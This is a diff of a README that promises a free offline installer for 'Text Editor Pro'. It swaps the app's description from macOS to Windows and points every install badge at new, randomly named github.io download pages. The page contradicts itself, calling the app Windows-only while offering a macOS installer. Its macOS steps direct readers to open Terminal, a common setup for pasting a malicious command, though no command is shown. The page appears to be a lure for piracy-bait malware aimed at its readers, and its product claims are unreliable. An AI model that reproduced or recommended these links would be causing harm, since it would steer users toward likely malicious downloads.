@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Text Editor Pro Free Installer** — Text Editor Pro is a macOS text and code editor designed for both casual writers and developers. Works without internet access, no account required. Full offline installation.
+**💻 Text Editor Pro Free Installer** — Text Editor Pro is a Windows text editor with a tabbed interface, syntax highlighting for dozens of languages, and a clean, modern design. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Text Editor Pro
 
-Text Editor Pro is a macOS text and code editor designed for both casual writers and developers. It features syntax highlighting for popular programming languages, a Markdown editor with live preview, fullscreen distraction-free mode, and quick open navigation. Text Editor Pro balances simplicity with useful developer features in a native macOS package available from the Mac App Store.
+Text Editor Pro is a Windows text editor with a tabbed interface, syntax highlighting for dozens of languages, and a clean, modern design. It is available on the Microsoft Store and provides a polished editing experience as an enhanced Notepad replacement.
 
 ---
 
 ## ❌ Problem: Text Editor Pro is hard to access
 
-- **macOS Only** — No Windows or Linux version
-- **Commercial License** — Paid application from the Mac App Store
-- **Feature Scope** — Less powerful than professional IDEs for large projects
-- **Extension System** — No plugin architecture for adding language support
+- **Windows Only** — Not available on macOS or Linux
+- **Basic Feature Set** — Missing advanced IDE and development features
+- **Microsoft Store Model** — Store-based distribution may limit some enterprise use cases
+- **Competition** — Notepad++ and VS Code offer more features for free
 
 ---
 
@@ -61,9 +61,9 @@ Text Editor Pro is a macOS text and code editor designed for both casual writers
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Text Editor Pro is a macOS text and code editor designed for both casual writers
 
 <div align="center">
 
-[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Text Editor Pro is a macOS text and code editor designed for both casual writers
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Text Editor Pro is a macOS text and code editor designed for both casual writers
 
 ---
 
-**Text Editor Pro Free Installer** — Text Editor Pro is a macOS text and code editor designed for both casual writers and developers. Install without internet connection today!
+**Text Editor Pro Free Installer** — Text Editor Pro is a Windows text editor with a tabbed interface, syntax highlighting for dozens of languages, and a clean, modern design. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Text Editor Pro](https://img.shields.io/badge/⬇_Install_Text+Editor+Pro-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
